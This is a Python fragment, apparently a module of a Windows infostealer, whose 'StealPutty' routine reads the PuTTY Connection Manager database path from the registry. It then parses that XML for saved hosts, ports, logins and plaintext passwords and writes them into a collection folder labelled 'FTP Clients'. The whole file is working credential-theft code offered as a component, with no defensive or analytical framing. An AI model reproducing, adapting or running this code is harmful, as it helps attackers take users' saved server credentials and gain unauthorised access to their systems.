import os
import win32con # type: ignore
import win32api # type: ignore
import xml.etree.ElementTree as ET


async def StealPutty(self, directory_path: str) -> None:
    try:
        database_path = self.get_default_database()
    except Exception as e:
        print(f"get default database putty error - {str(e)}")
        return

    full_path = os.path.join(directory_path, "FTP Clients", "Putty", database_path)
    
    if os.path.exists(full_path):
        pwd_found = await self.parse_xml(full_path)
        await self.save_to_file(pwd_found, directory_path)
    else:
        pass

def get_default_database(self) -> str:
    access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\ACS\\PuTTY Connection Manager', 0, access_read)
    this_name, _ = win32api.RegQueryValueEx(key, 'DefaultDatabase')
    return str(this_name) if this_name else ' '

async def parse_xml(self, xml_file: str) -> list:
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        pwd_found = []

        for connection in root.findall('connection'):
            values = {}
            for child in connection:
                if child.tag in ['name', 'protocol', 'host', 'port', 'description', 'login', 'password']:
                    values[child.tag] = child.text

            if values:
                pwd_found.append(values)

        return pwd_found
    except ET.ParseError as e:
        print(f"putty parse xml error - {str(e)}")
        return []

async def save_to_file(self, data: list, directory_path: str) -> None:
    output_file = os.path.join(directory_path, "FTP Clients", "Putty", 'putty_connections.txt')
    try:
        with open(output_file, 'w') as file:
            for entry in data:
                for key, value in entry.items():
                    file.write(f"{key}: {value}\n")
                file.write("\n")
    except IOError as e:
        print(f"ioerror putty save to file - {str(e)}")
        pass